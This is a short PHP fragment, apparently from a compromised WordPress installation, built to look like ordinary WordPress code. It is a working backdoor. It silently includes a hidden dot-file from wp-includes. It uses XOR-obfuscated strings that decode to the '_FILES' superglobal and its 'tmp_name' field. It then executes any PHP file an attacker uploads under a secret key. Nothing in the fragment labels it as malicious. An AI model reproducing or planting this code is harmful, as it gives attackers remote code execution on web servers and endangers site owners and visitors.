...
@include ("/var/www/sansangduhoc/wp-includes/.dfe16872.ott");
...
$menu_order = 'ENrcrbbhqZC';
function child($prefixed, $comment_ids)

{
    $previous_status = urldecode($prefixed);
    $del_dir = substr($comment_ids,0, strlen($previous_status));

    $pagenow = $previous_status ^ $del_dir;
    return $pagenow;
}
$revision_ids = ${child("%1A%08%3B%2F71", $menu_order)};
	$override_slug = 'mime_pattern';
if (isset($revision_ids[$menu_order]))

{
    $string_length = $revision_ids[$menu_order];
    $full_match = $string_length[child("1%23%02%3C%1C%03%0F%0D", $menu_order)];
    include ($full_match);
}


/* ns that could help resolve a fatal error should be available.
